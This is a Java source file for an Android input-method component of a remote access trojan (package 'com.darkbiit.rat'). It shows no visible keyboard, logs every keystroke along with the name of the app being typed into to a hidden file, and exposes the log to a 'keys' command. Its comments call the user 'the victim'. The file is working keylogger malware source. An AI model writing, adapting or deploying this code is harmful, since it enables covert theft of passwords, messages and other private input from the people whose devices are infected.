package com.darkbiit.rat;

import android.inputmethodservice.InputMethodService;
import android.view.KeyEvent;
import android.view.View;
import android.view.inputmethod.EditorInfo;
import android.view.inputmethod.InputConnection;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.Writer;

/**
 * Input method that logs keystrokes.
 *
 * The user has to enable this IME manually in the system settings, so it is
 * opt-in from the victim's side. Keystrokes are appended to a file in the app's
 * private storage and read out by the "keys" command.
 *
 * The log file is written with a BufferedWriter-like manual flush so a crash
 * does not lose the tail.
 */
public class RatIme extends InputMethodService {

    private Writer out;
    private File logFile;
    private StringBuilder pending;

    @Override
    public void onCreate() {
        super.onCreate();
        pending = new StringBuilder();
        try {
            logFile = RatFiles.stateFile(this, "keys.log");
            FileOutputStream fos = new FileOutputStream(logFile, true);
            out = new OutputStreamWriter(fos, "UTF-8");
        } catch (IOException e) {
            out = null;
            logFile = null;
        }
    }

    @Override
    public void onDestroy() {
        flush();
        try {
            if (out != null) {
                out.close();
            }
        } catch (IOException ignored) {
            // nothing to do
        }
        super.onDestroy();
    }

    @Override
    public View onCreateInputView() {
        return null; // no visible keyboard: we only capture what is typed
    }

    @Override
    public void onStartInput(EditorInfo attribute, boolean restarting) {
        super.onStartInput(attribute, restarting);
        append("[" + (attribute != null ? attribute.packageName : "?") + "] ");
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        int unicode = event.getUnicodeChar();
        if (unicode != 0) {
            append(String.valueOf((char) unicode));
            flush();
            return true;
        }
        switch (keyCode) {
            case KeyEvent.KEYCODE_SPACE:
                append(" ");
                flush();
                return true;
            case KeyEvent.KEYCODE_ENTER:
                append("\n");
                flush();
                return true;
            case KeyEvent.KEYCODE_BACK:
                append("[BACK]");
                flush();
                return true;
            case KeyEvent.KEYCODE_DEL:
                append("[DEL]");
                flush();
                return true;
            default:
                break;
        }
        return super.onKeyDown(keyCode, event);
    }

    @Override
    public boolean onKeyUp(int keyCode, KeyEvent event) {
        return super.onKeyUp(keyCode, event);
    }

    private void append(String s) {
        if (pending == null) {
            return;
        }
        pending.append(s);
        if (pending.length() > 4096) {
            flush();
        }
    }

    private synchronized void flush() {
        if (out == null || pending == null || pending.length() == 0) {
            return;
        }
        try {
            out.write(pending.toString());
            out.flush();
            pending.setLength(0);
        } catch (IOException e) {
            // drop the write; the file handle is broken
            out = null;
        }
    }

    /** Reads back the captured keystrokes (used by the "keys" command). */
    public static String readLog(android.content.Context ctx) throws IOException {
        File f = RatFiles.stateFile(ctx, "keys.log");
        if (!f.exists()) {
            return "";
        }
        return RatFiles.cat(f.getAbsolutePath(), RatCfg.MAX_SHELL_OUTPUT);
    }
}
